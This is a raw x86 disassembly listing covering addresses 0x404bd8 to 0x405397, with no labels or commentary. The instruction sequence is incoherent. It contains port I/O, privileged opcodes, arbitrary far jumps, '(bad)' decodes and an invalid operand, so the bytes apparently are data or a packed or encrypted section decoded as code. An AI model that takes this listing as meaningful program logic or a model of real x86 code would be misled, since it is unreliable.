  404bd8:	cmp    ecx,DWORD PTR [ebx+0x4f]
  404bdb:	mov    ebx,0xfc0a512e
  404be0:	lea    esp,[ecx-0x14]
  404be3:	in     eax,0x54
  404be5:	xor    DWORD PTR [ebx-0x2d379085],0x4d
  404bec:	mov    ds:0x23cd0758,al
  404bf1:	in     eax,dx
  404bf2:	stos   DWORD PTR es:[edi],eax
  404bf3:	les    esi,FWORD PTR [edx+0x53]
  404bf6:	xchg   DWORD PTR [ecx+edi*4],ebx
  404bf9:	push   ebp
  404bfa:	push   ds
  404bfb:	and    bl,BYTE PTR [edi]
  404bfd:	xor    esi,DWORD PTR [ecx]
  404bff:	and    cl,BYTE PTR [ecx+0x314a64d7]
  404c05:	cld    
  404c06:	addr16 leave 
  404c08:	rcl    BYTE PTR [ebp+0x40f75fb9],0x88
  404c0f:	iret   
  404c10:	xor    eax,0x760d46a9
  404c15:	jecxz  0x404bbe
  404c17:	cmp    dl,BYTE PTR [ebx]
  404c19:	jns    0x404bc3
  404c1b:	inc    edi
  404c1c:	pop    edi
  404c1d:	pop    es
  404c1e:	adc    DWORD PTR [edi],esp
  404c20:	sub    eax,0xb62c5525
  404c25:	aaa    
  404c26:	stos   BYTE PTR es:[edi],al
  404c27:	int3   
  404c28:	not    DWORD PTR [esp+eiz*8-0x74ffddf7]
  404c2f:	add    DWORD PTR [ebx],edx
  404c31:	sbb    bl,BYTE PTR [eax+0x39]
  404c34:	xor    ebx,DWORD PTR [edi-0x4d]
  404c37:	scas   eax,DWORD PTR es:[edi]
  404c38:	test   al,0xa6
  404c3a:	clc    
  404c3b:	jnp    0x404bcb
  404c3d:	adc    ah,bl
  404c3f:	or     al,BYTE PTR [esi+0x693ed680]
  404c45:	pop    edx
  404c46:	jle    0x404be2
  404c48:	push   edi
  404c49:	loope  0x404cc2
  404c4b:	xor    al,0xbd
  404c4d:	adc    DWORD PTR [edx],esi
  404c4f:	mov    ah,0x77
  404c51:	lods   ax,WORD PTR ds:[esi]
  404c53:	loop   0x404cca
  404c55:	jg     0x404cac
  404c57:	lea    edx,[eax+eax*8-0x77bc5a7b]
  404c5e:	das    
  404c5f:	dec    eax
  404c60:	xchg   esp,eax
  404c61:	pop    edx
  404c62:	out    dx,al
  404c63:	push   ecx
  404c64:	xor    edi,DWORD PTR [esi+0x16]
  404c67:	int    0xb7
  404c69:	nop    DWORD PTR ds:0x8f152210
  404c70:	gs or  ebp,edx
  404c73:	nop
  404c74:	pusha  
  404c75:	inc    esp
  404c76:	push   ecx
  404c77:	(bad)  
  404c79:	lea    esp,[eax+0x3]
  404c7c:	jge    0x404c44
  404c7e:	sbb    al,0x7
  404c80:	sbb    edx,DWORD PTR [eax]
  404c82:	or     BYTE PTR [edi],0x7d
  404c85:	inc    ecx
  404c86:	sbb    al,ah
  404c88:	adc    al,0x61
  404c8a:	jb     0x404c56
  404c8c:	mov    esp,0x446963e6
  404c91:	fadd   st(2),st
  404c93:	jnp    0x404c86
  404c95:	pop    edi
  404c96:	xchg   ebp,eax
  404c97:	ficom  WORD PTR [edx]
  404c99:	clc    
  404c9a:	push   eax
  404c9b:	xor    BYTE PTR [esp+edi*2+0x6d94becf],ch
  404ca2:	retf   
  404ca3:	inc    ebx
  404ca4:	dec    esi
  404ca5:	sbb    eax,0x1a6dfe1b
  404caa:	out    dx,eax
  404cab:	lea    esi,ds:0xf1aa3d17
  404cb1:	mov    al,0x27
  404cb3:	add    eax,0x224622f9
  404cb8:	push   0x5f
  404cba:	jecxz  0x404c4c
  404cbc:	fdiv   QWORD PTR [ebp*4-0x4782109c]
  404cc3:	ret    
  404cc4:	jns    0x404c9d
  404cc6:	(bad)  
  404cc7:	out    dx,al
  404cc8:	lahf   
  404cc9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404cca:	stos   DWORD PTR es:[edi],eax
  404ccb:	xor    DWORD PTR [esi+0x5ae38d91],ebx
  404cd1:	lods   eax,DWORD PTR ds:[esi]
  404cd2:	push   ds
  404cd3:	lahf   
  404cd4:	popf   
  404cd5:	int3   
  404cd6:	(bad)  
  404cd7:	clc    
  404cd8:	mov    bh,0x60
  404cda:	and    eax,0x3ef7a350
  404cdf:	xor    BYTE PTR [ecx],0x83
  404ce2:	loopne 0x404d1e
  404ce4:	(bad)  
  404ce5:	aas    
  404ce6:	xchg   edx,eax
  404ce7:	sub    bh,0xba
  404cea:	pop    ds
  404ceb:	stc    
  404cec:	rol    BYTE PTR [ebp-0x343dcc],cl
  404cf2:	push   esi
  404cf3:	push   esp
  404cf4:	mov    ch,0xd3
  404cf6:	xchg   esi,eax
  404cf7:	add    eax,0x9bd8bb01
  404cfc:	in     al,0x62
  404cfe:	shl    BYTE PTR [edx],1
  404d00:	aad    0xa0
  404d02:	cli    
  404d03:	fnsave [ebx-0x41cae244]
  404d09:	test   eax,0x47d62eed
  404d0e:	adc    BYTE PTR [esi+0x4f123af0],ch
  404d14:	pop    edx
  404d15:	jmp    0x24033a18
  404d1a:	xchg   ebx,eax
  404d1b:	fild   WORD PTR [edi+0x5ed0b303]
  404d21:	stos   DWORD PTR es:[edi],eax
  404d22:	mov    ch,0x93
  404d24:	out    0xb2,al
  404d26:	jecxz  0x404d11
  404d28:	jae    0x404cbc
  404d2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d2b:	ror    esi,cl
  404d2d:	retf   
  404d2e:	adc    BYTE PTR [ecx],bl
  404d30:	out    0x93,eax
  404d32:	cwde   
  404d33:	or     ah,al
  404d35:	fcmovnb st,st(0)
  404d37:	aaa    
  404d38:	xchg   ebp,eax
  404d39:	rcl    DWORD PTR [ebx+0x5ca3fc87],0x5d
  404d40:	pop    ebx
  404d41:	mov    al,ds:0x2fa2e0cc
  404d46:	mov    esp,0x24b7c8cd
  404d4b:	ins    BYTE PTR es:[edi],dx
  404d4c:	imul   eax,DWORD PTR [edi],0xffffffa1
  404d4f:	imul   ebx,DWORD PTR ds:0xbb7f1016,0xc34dc194
  404d59:	push   edi
  404d5a:	mov    ebx,0x98eda67d
  404d5f:	sbb    al,0x6b
  404d61:	inc    edx
  404d62:	or     eax,0x188df3c7
  404d67:	in     eax,0x68
  404d69:	cmp    DWORD PTR [ecx],esi
  404d6b:	mov    ebp,0xd68c9fb5
  404d70:	retf   
  404d71:	sbb    DWORD PTR [edx],ecx
  404d73:	pop    ebx
  404d74:	mov    edi,0x4dcc354d
  404d79:	pop    ss
  404d7a:	adc    ebp,eax
  404d7c:	and    DWORD PTR [edi],edx
  404d7e:	mov    ebp,0xd8c63f6f
  404d83:	jle    0x404d7b
  404d85:	fdivr  st(0),st
  404d87:	cli    
  404d88:	or     al,0x38
  404d8a:	test   DWORD PTR [ecx+0x72bc1649],ecx
  404d90:	dec    edx
  404d91:	jl     0x404d7a
  404d93:	aam    0x27
  404d95:	mov    dl,0x4
  404d97:	push   esp
  404d98:	xor    DWORD PTR [edx+0x6b815ee6],eax
  404d9e:	int3   
  404d9f:	in     eax,dx
  404da0:	jmp    0x98e4:0x7aeeb3ff
  404da7:	or     al,0x20
  404da9:	lock mov edx,0xb8f80e39
  404daf:	inc    ebp
  404db0:	stc    
  404db1:	leave  
  404db2:	jg     0x404dd3
  404db4:	ror    BYTE PTR [ecx],0xda
  404db7:	jmp    0x8912:0xec0717fc
  404dbe:	add    BYTE PTR [esi],ch
  404dc0:	mov    dh,0x93
  404dc2:	(bad)  
  404dc3:	iret   
  404dc4:	sub    edi,ebp
  404dc6:	xchg   ebx,eax
  404dc7:	xor    DWORD PTR [eax],edx
  404dc9:	sti    
  404dca:	fcom   DWORD PTR [esi]
  404dcc:	xlat   BYTE PTR ds:[ebx]
  404dcd:	sbb    DWORD PTR [eax+0x2818f2ad],esi
  404dd3:	call   0x1924:0xfe862101
  404dda:	test   BYTE PTR [edi+0x76176914],bh
  404de0:	fimul  DWORD PTR cs:[edi]
  404de3:	push   ss
  404de4:	jne    0x404e5a
  404de6:	lods   al,BYTE PTR ds:[esi]
  404de7:	and    BYTE PTR [eax-0x5e1ec9e],0x81
  404dee:	or     al,0x54
  404df0:	cmp    DWORD PTR [esp+edx*1+0x72],edi
  404df4:	pop    ecx
  404df5:	mov    eax,ds:0xe3bb51fb
  404dfa:	push   edx
  404dfb:	xor    ebx,DWORD PTR [ecx]
  404dfd:	adc    DWORD PTR [eax],eax
  404dff:	jl     0x404e63
  404e01:	add    DWORD PTR [ebp+0x2b],ebx
  404e04:	xchg   esp,eax
  404e05:	xchg   edi,eax
  404e06:	stos   DWORD PTR es:[edi],eax
  404e07:	inc    esi
  404e08:	push   edi
  404e09:	cmp    BYTE PTR [edi],ch
  404e0b:	fadd   DWORD PTR [ecx-0x6a]
  404e0e:	pop    esi
  404e0f:	xchg   ecx,eax
  404e10:	cmp    al,0x7d
  404e12:	clc    
  404e13:	clc    
  404e14:	jp     0x404dff
  404e16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e17:	mov    BYTE PTR [ebx+0x2a],dl
  404e1a:	sub    ecx,ecx
  404e1c:	and    ebx,DWORD PTR [ebx-0x50f73e00]
  404e22:	pushf  
  404e23:	cmp    al,0x54
  404e25:	inc    ebx
  404e26:	or     DWORD PTR [ecx],ebp
  404e28:	test   BYTE PTR [eax-0x55],dh
  404e2b:	scas   al,BYTE PTR es:[edi]
  404e2c:	mov    ds:0x9d894b58,al
  404e31:	mov    edi,0x8ae926a9
  404e36:	push   esp
  404e37:	loopne 0x404e93
  404e39:	ret    0xc7a1
  404e3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e3d:	repnz add BYTE PTR [edi+esi*1+0x30b1d8b9],dh
  404e45:	rcl    DWORD PTR [ecx+edi*2-0x2a],1
  404e49:	arpl   WORD PTR [ecx+ebx*1-0x70cfd70e],dx
  404e50:	dec    ebp
  404e51:	xchg   ecx,eax
  404e52:	push   esi
  404e53:	cmp    DWORD PTR ds:[esi-0x70050e6d],edx
  404e5a:	sbb    BYTE PTR ds:0x27e0be4e,0x36
  404e61:	stc    
  404e62:	or     al,0x8f
  404e64:	xchg   ebp,eax
  404e65:	xor    dl,BYTE PTR [edi+eiz*2+0x12]
  404e69:	imul   edi,DWORD PTR fs:[edi+0x88ce8a3],0x7d
  404e71:	add    edx,eax
  404e73:	mov    esi,0xedb275d7
  404e78:	mov    eax,ds:0x8d55d16
  404e7d:	jecxz  0x404eb3
  404e7f:	sbb    DWORD PTR [edx],esi
  404e81:	adc    eax,0xfa83c5d8
  404e86:	cmp    eax,DWORD PTR [edx+0x29]
  404e89:	retf   0xb8ac
  404e8c:	aad    0xfa
  404e8e:	mov    DWORD PTR [edi],ecx
  404e90:	popf   
  404e91:	mov    ebp,0xdae48d5d
  404e96:	lods   eax,DWORD PTR ds:[esi]
  404e97:	xor    eax,0xbf6361aa
  404e9c:	dec    ebp
  404e9d:	sahf   
  404e9e:	push   ebx
  404e9f:	and    ah,BYTE PTR ds:0xaa640a36
  404ea5:	cmp    BYTE PTR [ecx],bl
  404ea7:	or     BYTE PTR [ebx],bh
  404ea9:	loope  0x404e85
  404eab:	icebp  
  404eac:	pop    ds
  404ead:	pop    edi
  404eae:	mov    eax,ds:0xf4bf1aaa
  404eb3:	cmp    eax,0xf5f3fba6
  404eb8:	pop    ds
  404eb9:	mov    edi,0x39bfaf08
  404ebe:	xchg   DWORD PTR [edx-0xe7af9d6],edi
  404ec4:	or     ah,BYTE PTR [edx]
  404ec6:	ins    DWORD PTR es:[edi],dx
  404ec7:	dec    eax
  404ec8:	push   edi
  404ec9:	test   BYTE PTR [edi],ch
  404ecb:	xlat   BYTE PTR ds:[ebx]
  404ecc:	ret    
  404ecd:	fmul   DWORD PTR [ebx]
  404ecf:	in     eax,0xc2
  404ed1:	xchg   esp,eax
  404ed2:	fidivr WORD PTR [ebx-0xe]
  404ed5:	hlt    
  404ed6:	mov    bl,0x5a
  404ed8:	xchg   ebx,eax
  404ed9:	es shl esp,0x47
  404edd:	dec    esi
  404ede:	test   DWORD PTR [edi-0x4b4e3303],0x22faa1ce
  404ee8:	sbb    dh,ah
  404eea:	stos   BYTE PTR es:[edi],al
  404eeb:	push   esp
  404eec:	mov    BYTE PTR [esi-0x51f7a6e3],al
  404ef2:	fnstcw WORD PTR ds:0x9e4808c8
  404ef8:	push   eax
  404ef9:	pusha  
  404efa:	cs in  al,dx
  404efc:	sub    DWORD PTR [eax],edi
  404efe:	(bad)  
  404f00:	les    esi,FWORD PTR [ebp+0x67]
  404f03:	std    
  404f04:	ror    BYTE PTR ds:0x59e46a4d,0xe7
  404f0b:	mov    cl,0x2b
  404f0d:	fild   DWORD PTR [ecx-0x5f]
  404f10:	ficom  DWORD PTR [esi]
  404f12:	fcom   st(2)
  404f14:	outs   dx,BYTE PTR ds:[esi]
  404f15:	lahf   
  404f16:	icebp  
  404f17:	sub    ebx,DWORD PTR [edx-0x60b9d22b]
  404f1d:	or     al,0xcb
  404f1f:	leave  
  404f20:	pop    es
  404f21:	or     al,0xa1
  404f23:	cmp    ch,BYTE PTR [eax+0x62a8aedf]
  404f29:	cmp    al,0xb7
  404f2b:	or     al,0x31
  404f2d:	jb     0x404f5c
  404f2f:	mov    ds:0xdc95eef9,eax
  404f34:	sar    DWORD PTR [ecx],0x62
  404f37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f38:	test   BYTE PTR [ecx+0x5289d1b5],ch
  404f3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f3f:	jp     0x404ed9
  404f41:	adc    DWORD PTR [ebx],eax
  404f43:	std    
  404f44:	shl    dl,0x5a
  404f47:	adc    eax,0xc4ab0551
  404f4c:	or     DWORD PTR [eax-0x17],0x31426040
  404f53:	xchg   esp,eax
  404f54:	nop
  404f55:	push   ebp
  404f56:	and    edi,DWORD PTR [edi-0x4f9898a3]
  404f5c:	and    ah,BYTE PTR [edi-0x71b0f1d4]
  404f62:	or     al,0xba
  404f64:	dec    ebx
  404f65:	mov    ebp,0x34642e2f
  404f6a:	mov    esp,0xc7a06df4
  404f6f:	jp     0x404f8b
  404f71:	mov    ds:0xee0d01e4,al
  404f76:	out    dx,al
  404f77:	and    ecx,edx
  404f79:	fild   WORD PTR [ebp+0x378df6ed]
  404f7f:	std    
  404f80:	mov    ch,0x3f
  404f82:	inc    BYTE PTR [eax]
  404f84:	sub    eax,0xc6116acb
  404f89:	xor    cl,bl
  404f8b:	xor    bl,BYTE PTR [ecx]
  404f8d:	or     al,0x46
  404f8f:	in     eax,0xc8
  404f91:	gs test al,0x80
  404f94:	mov    WORD PTR [ebp-0x27],fs
  404f97:	pop    ebx
  404f98:	aad    0x87
  404f9a:	out    0xca,al
  404f9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f9d:	test   eax,0x9ae122cf
  404fa2:	outs   dx,DWORD PTR ds:[esi]
  404fa3:	pop    eax
  404fa4:	mov    ch,0x9c
  404fa6:	std    
  404fa7:	xchg   ebp,eax
  404fa8:	lods   al,BYTE PTR ds:[esi]
  404fa9:	pop    ebp
  404faa:	shl    DWORD PTR [edi+0x16],0x84
  404fae:	cs stos DWORD PTR es:[edi],eax
  404fb0:	mov    bl,ah
  404fb2:	inc    eax
  404fb3:	pop    esp
  404fb4:	inc    eax
  404fb5:	inc    esi
  404fb6:	(bad)  
  404fb7:	(bad)  
  404fb8:	test   DWORD PTR [eax+esi*8+0x71],esi
  404fbc:	leave  
  404fbd:	aam    0xe
  404fbf:	jg     0x404f6a
  404fc1:	in     al,0x2e
  404fc3:	sbb    BYTE PTR [ebp+0x7c],ch
  404fc6:	mov    ecx,0xbb5ea091
  404fcb:	std    
  404fcc:	add    bl,BYTE PTR [edi-0x3082ae98]
  404fd2:	jg     0x40501e
  404fd4:	aam    0x23
  404fd6:	xchg   edi,eax
  404fd7:	iret   
  404fd8:	shl    DWORD PTR [ebp+0x4dc20159],cl
  404fde:	adc    eax,0x5cd3f474
  404fe3:	sub    BYTE PTR [esi+0x5b],0x98
  404fe7:	adc    eax,0xe9274ddb
  404fec:	or     DWORD PTR [edi],eax
  404fee:	mov    esp,0x691e6117
  404ff3:	cld    
  404ff4:	aas    
  404ff5:	rcl    DWORD PTR [eax-0x470a7576],0xe5
  404ffc:	and    BYTE PTR [ebp+0x79],0xec
  405000:	fisub  WORD PTR [ebx+ecx*4-0x11]
  405004:	jecxz  0x404fbb
  405006:	test   eax,0x6439cb09
  40500b:	dec    edi
  40500c:	jl     0x405016
  40500e:	jmp    0xb5ac9655
  405013:	sbb    edi,edx
  405015:	lahf   
  405016:	push   ecx
  405017:	cwde   
  405018:	inc    esi
  405019:	ror    DWORD PTR [ecx+0x35],0xf7
  40501d:	mov    esi,0xa216d723
  405022:	imul   esp,DWORD PTR [edi+0x4b01128a],0x228a612a
  40502c:	xchg   esp,ecx
  40502e:	xor    al,BYTE PTR [esp]
  405031:	les    ebx,FWORD PTR [edi-0x33]
  405034:	std    
  405035:	hlt    
  405036:	in     al,dx
  405037:	mov    eax,0x7c8707ae
  40503c:	repnz pop ecx
  40503e:	xchg   ecx,eax
  40503f:	out    dx,al
  405040:	mov    ebp,0x9e66779d
  405045:	les    ebx,FWORD PTR [esp+eiz*2-0x70]
  405049:	cs ret 
  40504b:	sbb    esp,DWORD PTR [edi-0x3b]
  40504e:	add    esp,DWORD PTR [esi+eax*4]
  405051:	ins    BYTE PTR es:[edi],dx
  405052:	ss and esi,DWORD PTR cs:[eax-0x14]
  405057:	loope  0x4050cc
  405059:	out    0x1b,al
  40505b:	loope  0x405067
  40505d:	ja     0x40509e
  40505f:	pushf  
  405060:	inc    esp
  405061:	cmp    al,0x28
  405063:	or     bl,BYTE PTR [ecx+0x2f]
  405066:	add    dl,dl
  405068:	bound  edx,QWORD PTR [esi]
  40506a:	inc    esi
  40506b:	ins    BYTE PTR es:[edi],dx
  40506c:	js     0x405003
  40506e:	hlt    
  40506f:	jno    0x405051
  405071:	ins    BYTE PTR es:[edi],dx
  405072:	scas   eax,DWORD PTR es:[edi]
  405073:	and    BYTE PTR [ecx],0x6b
  405076:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405077:	mov    ch,0xdf
  405079:	mov    edi,0xd6f778bf
  40507e:	jne    0x4050bd
  405080:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405081:	retf   
  405082:	xchg   dh,al
  405084:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405085:	outs   dx,BYTE PTR ds:[esi]
  405086:	inc    eax
  405087:	fs pop edx
  405089:	(bad)  
  40508a:	retf   0x2e71
  40508d:	data16 icebp 
  40508f:	iret   
  405090:	push   es
  405091:	inc    eax
  405092:	outs   dx,BYTE PTR ds:[esi]
  405093:	mov    ecx,0x9ff30925
  405098:	jmp    0xca1f:0xd06ccf64
  40509f:	imul   eax,DWORD PTR [esi+0x6e0e5b54],0xffffffac
  4050a6:	dec    ebx
  4050a7:	lds    ecx,FWORD PTR [ecx+0x5aa2ea03]
  4050ad:	pop    ss
  4050ae:	sti    
  4050af:	out    dx,al
  4050b0:	push   edi
  4050b1:	iret   
  4050b2:	or     dl,dh
  4050b4:	fwait
  4050b5:	ja     0x4050f6
  4050b7:	ficomp DWORD PTR [edi]
  4050b9:	inc    ebp
  4050ba:	int3   
  4050bb:	lock in al,dx
  4050bd:	push   edi
  4050be:	repnz jecxz 0x40509c
  4050c1:	jl     0x4050f9
  4050c3:	je     0x40506c
  4050c5:	xor    BYTE PTR [esi+0x39],al
  4050c8:	jmp    0xf073:0xafbd7baf
  4050cf:	inc    edi
  4050d0:	pop    edx
  4050d1:	ss cmp al,0x63
  4050d4:	rol    DWORD PTR [eax-0x75],cl
  4050d7:	dec    edx
  4050d8:	and    BYTE PTR [esi+0x52],bl
  4050db:	mov    ebp,0xd3e185ab
  4050e0:	mov    ds:0x2bcff86b,eax
  4050e5:	sbb    DWORD PTR [edx+esi*2],ebp
  4050e8:	cmc    
  4050e9:	mov    ah,0x30
  4050eb:	mov    ebx,0x6011c115
  4050f0:	add    bh,dh
  4050f2:	or     cl,BYTE PTR [ebx]
  4050f4:	push   ds
  4050f5:	mov    ecx,0xcacaa555
  4050fa:	dec    esp
  4050fb:	jae    0x405098
  4050fd:	jmp    DWORD PTR ds:0x9da709a1
  405103:	loopne 0x40517e
  405105:	call   0x9599:0x2aa9d59c
  40510c:	test   esp,esp
  40510e:	pop    edx
  40510f:	xor    ebx,DWORD PTR [ecx+edi*2]
  405112:	adc    al,0x4
  405114:	push   ebp
  405115:	push   0x32
  405117:	sub    dh,dh
  405119:	leave  
  40511a:	lea    ecx,[esp+edx*2+0x79]
  40511e:	jmp    0x5d89a32b
  405123:	and    esp,DWORD PTR [edx]
  405125:	add    eax,0x22146ed5
  40512a:	jg     0x4050eb
  40512c:	sub    BYTE PTR [ecx],cl
  40512e:	push   0x4229b268
  405133:	or     ch,BYTE PTR [ecx]
  405135:	in     eax,0xc0
  405137:	sbb    cl,cl
  405139:	enter  0x84b0,0x52
  40513d:	popa   
  40513e:	adc    DWORD PTR [eax],ecx
  405140:	jbe    0x4051a1
  405142:	ins    BYTE PTR es:[edi],dx
  405143:	scas   al,BYTE PTR es:[edi]
  405144:	enter  0x43bf,0xc8
  405148:	cmp    DWORD PTR [esi],0x1c
  40514b:	pushf  
  40514c:	mov    esi,0x3ad06a0c
  405151:	jge    0x4050e1
  405153:	cmp    edx,DWORD PTR [esi+edx*8-0x7359859c]
  40515a:	xor    dh,dh
  40515c:	sbb    esp,DWORD PTR [ebx]
  40515e:	inc    ecx
  40515f:	cmp    al,0x9e
  405161:	add    ebx,DWORD PTR ds:0x63197da4
  405167:	test   al,0xa6
  405169:	into   
  40516a:	push   cx
  40516c:	jecxz  0x40516e
  40516e:	test   al,0xb7
  405170:	push   ecx
  405171:	jmp    0x405159
  405173:	push   ebx
  405174:	sbb    DWORD PTR [eax+ebx*4-0x2a],ebp
  405178:	mov    WORD PTR [edi+0x72],cs
  40517b:	fild   QWORD PTR ss:0xffcfe719
  405182:	sbb    BYTE PTR [ecx],0x7f
  405185:	mul    BYTE PTR [ecx-0xdc549ac]
  40518b:	addr16 gs mov ecx,0x5ef816c6
  405192:	add    bh,BYTE PTR [ecx]
  405194:	dec    ecx
  405195:	add    dh,0xee
  405198:	outs   dx,BYTE PTR ds:[esi]
  405199:	add    esp,esi
  40519b:	lea    esp,[esi+0x33]
  40519e:	jecxz  0x40514f
  4051a0:	ins    BYTE PTR es:[edi],dx
  4051a1:	sbb    esp,DWORD PTR [ecx+0x2]
  4051a4:	enter  0x71a8,0x11
  4051a8:	xchg   esp,eax
  4051a9:	push   esp
  4051aa:	add    DWORD PTR [ecx-0x22],ebp
  4051ad:	and    eax,0x62e3dee3
  4051b2:	dec    edx
  4051b3:	mov    ch,0x6b
  4051b5:	mov    al,0x3
  4051b7:	or     BYTE PTR [edx],ah
  4051b9:	pushf  
  4051ba:	push   0x266653f1
  4051bf:	add    dh,ah
  4051c1:	pop    ebp
  4051c2:	or     ebx,ebp
  4051c4:	jecxz  0x405244
  4051c6:	(bad)  
  4051c8:	xor    ebp,DWORD PTR [edi+0x6f04a6bc]
  4051ce:	je     0x4051d6
  4051d0:	mov    cl,BYTE PTR [eax+0x40805fd1]
  4051d6:	jbe    0x40519f
  4051d8:	cdq    
  4051d9:	sti    
  4051da:	push   cs
  4051db:	xlat   BYTE PTR ds:[ebx]
  4051dc:	(bad)  
  4051dd:	sti    
  4051de:	jns    0x405226
  4051e0:	outs   dx,BYTE PTR ds:[esi]
  4051e1:	mov    eax,ds:0xe9946676
  4051e6:	enter  0x6fcd,0x8b
  4051ea:	bound  ebx,QWORD PTR [ebp+0x3c12398e]
  4051f0:	lds    esi,FWORD PTR [ebp-0x4a]
  4051f3:	jne    0x4051de
  4051f5:	clc    
  4051f6:	cmp    bl,BYTE PTR [eax-0x15]
  4051f9:	adc    DWORD PTR [edx],ecx
  4051fb:	loope  0x40527c
  4051fd:	jmp    0xa77a:0x67e8e667
  405204:	repz in eax,0x6f
  405207:	call   0xe907b409
  40520c:	in     al,0xc2
  40520e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40520f:	and    cl,BYTE PTR ds:0x8ed0a60a
  405215:	mov    bl,0x80
  405217:	ins    BYTE PTR es:[edi],dx
  405218:	push   esp
  405219:	mov    ebx,0x9b092da7
  40521e:	retf   0xefff
  405221:	pop    esp
  405222:	push   cs
  405223:	dec    esi
  405224:	inc    eax
  405225:	int    0xff
  405227:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405228:	fucomi st,st(7)
  40522a:	mov    cl,0xf1
  40522c:	xor    DWORD PTR [edx],ebx
  40522e:	and    edi,DWORD PTR [edx]
  405230:	mov    dh,0xd1
  405232:	fiadd  WORD PTR [esi-0x28]
  405235:	jns    0x40521f
  405237:	fdivr  DWORD PTR [ebp+0x7f]
  40523a:	push   edi
  40523b:	push   cs
  40523c:	in     eax,0x4f
  40523e:	stos   BYTE PTR es:[edi],al
  40523f:	mov    ah,0xf7
  405241:	mov    cl,0x31
  405243:	add    dl,BYTE PTR [eax]
  405245:	addr16 jmp 0x6023:0x44f6c541
  40524d:	in     eax,dx
  40524e:	and    al,0x6f
  405250:	mov    eax,DWORD PTR ds:0x636158e4
  405256:	jecxz  0x40524a
  405258:	ret    
  405259:	cmovge esp,ebx
  40525c:	test   edi,esp
  40525e:	stos   DWORD PTR es:[edi],eax
  40525f:	(bad)  
  405260:	mov    bh,0x3a
  405262:	sbb    esi,DWORD PTR [ecx-0x2055d3ed]
  405268:	push   ebp
  405269:	jb     0x40525b
  40526b:	outs   dx,BYTE PTR ds:[esi]
  40526c:	pushf  
  40526d:	xchg   BYTE PTR [esi+0x6062427e],ch
  405273:	sub    eax,0xe8955d30
  405278:	mov    al,BYTE PTR [edi]
  40527a:	inc    esp
  40527b:	adc    al,0xbe
  40527d:	shr    edi,0x47
  405280:	push   ds
  405281:	cmp    bh,bl
  405283:	fwait
  405284:	xor    DWORD PTR [esi],eax
  405286:	xchg   DWORD PTR [edi],edx
  405288:	fucom  st(5)
  40528a:	mov    BYTE PTR [ebp-0x6a],al
  40528d:	mov    ebp,0xc198a723
  405292:	retf   0xecd
  405295:	jmp    0x405270
  405297:	out    0xa6,eax
  405299:	sub    DWORD PTR ds:0xd14a1828,ecx
  40529f:	push   es
  4052a0:	lea    ebx,[ecx-0x39]
  4052a3:	test   dl,bh
  4052a5:	jno    0x4052e5
  4052a7:	ss pop edi
  4052a9:	sbb    eax,0x8cc83876
  4052ae:	or     ah,dl
  4052b0:	sub    edx,DWORD PTR fs:[ecx+0x43421b91]
  4052b7:	mov    bl,0x9c
  4052b9:	adc    eax,DWORD PTR [ebx+0x29985c3d]
  4052bf:	dec    ecx
  4052c0:	jmp    0xbe7f:0x5a5e187b
  4052c7:	xchg   esp,eax
  4052c8:	aas    
  4052c9:	mov    dh,0xd5
  4052cb:	test   eax,0x95954b8a
  4052d0:	mov    al,BYTE PTR [edi]
  4052d2:	lods   eax,DWORD PTR ds:[esi]
  4052d3:	jae    0x40534b
  4052d5:	pop    ss
  4052d6:	add    dl,BYTE PTR [ecx+0x3ef40a6b]
  4052dc:	in     al,0x77
  4052de:	out    0x55,al
  4052e0:	shl    DWORD PTR [edx],0xb3
  4052e3:	dec    ebx
  4052e4:	jo     0x405329
  4052e6:	add    eax,0x6c2d0941
  4052eb:	pop    esi
  4052ec:	adc    DWORD PTR [ebx+eax*4+0x1c],esp
  4052f0:	push   es
  4052f1:	es ds dec ebp
  4052f4:	lods   eax,DWORD PTR ds:[esi]
  4052f5:	and    eax,0xc3afb46f
  4052fa:	dec    edx
  4052fb:	sub    esp,esi
  4052fd:	out    0x29,eax
  4052ff:	xchg   BYTE PTR [edi],cl
  405301:	test   BYTE PTR ss:[edi],dh
  405304:	inc    eax
  405305:	sbb    eax,0xc24b6784
  40530a:	mov    bl,0x13
  40530c:	ret    0x5134
  40530f:	xor    eax,0xa65f905a
  405314:	stc    
  405315:	ret    
  405316:	mov    ?,WORD PTR [eax-0x5b4fe10]
  40531c:	stc    
  40531d:	mov    cl,bh
  40531f:	inc    edx
  405320:	dec    esp
  405321:	mov    al,ch
  405323:	adc    cl,ah
  405325:	push   eax
  405326:	nop
  405327:	hlt    
  405328:	sahf   
  405329:	test   ebp,0xdce5780
  40532f:	ficomp DWORD PTR [ebx-0x1adfa24c]
  405335:	lahf   
  405336:	lock int3 
  405338:	sub    eax,0xd758be56
  40533d:	or     al,0x8e
  40533f:	jmp    0x3ea7:0x96f87d56
  405346:	mov    al,0xac
  405348:	dec    ecx
  405349:	or     BYTE PTR [edi+0x60dc2102],bl
  40534f:	jo     0x405365
  405351:	pusha  
  405352:	xchg   edx,eax
  405353:	(bad)  
  405354:	aaa    
  405355:	mov    eax,0xcf82f42a
  40535a:	popf   
  40535b:	jle    0x40537a
  40535d:	cld    
  40535e:	fbld   TBYTE PTR [ecx-0x381ff982]
  405364:	stc    
  405365:	or     dl,BYTE PTR [esp+esi*2]
  405368:	retf   0x9964
  40536b:	and    eax,0xd2c9d0b3
  405370:	je     0x405307
  405372:	lahf   
  405373:	pop    ecx
  405374:	pusha  
  405375:	scas   eax,DWORD PTR es:[edi]
  405376:	adc    BYTE PTR [esi],dh
  405378:	mov    esi,0x311feab0
  40537d:	inc    edx
  40537e:	add    BYTE PTR [ecx+0xe],bh
  405381:	xor    al,0x56
  405383:	in     eax,dx
  405384:	cs sti 
  405386:	mov    eax,ds:0x38288824
  40538b:	add    DWORD PTR [edi-0x28],edx
  40538e:	call   0x126740f4
  405393:	jo     0x4053f3
  405395:	pushf  
  405396:	xchg   esi,eax
  405397:	call   0xd02706d
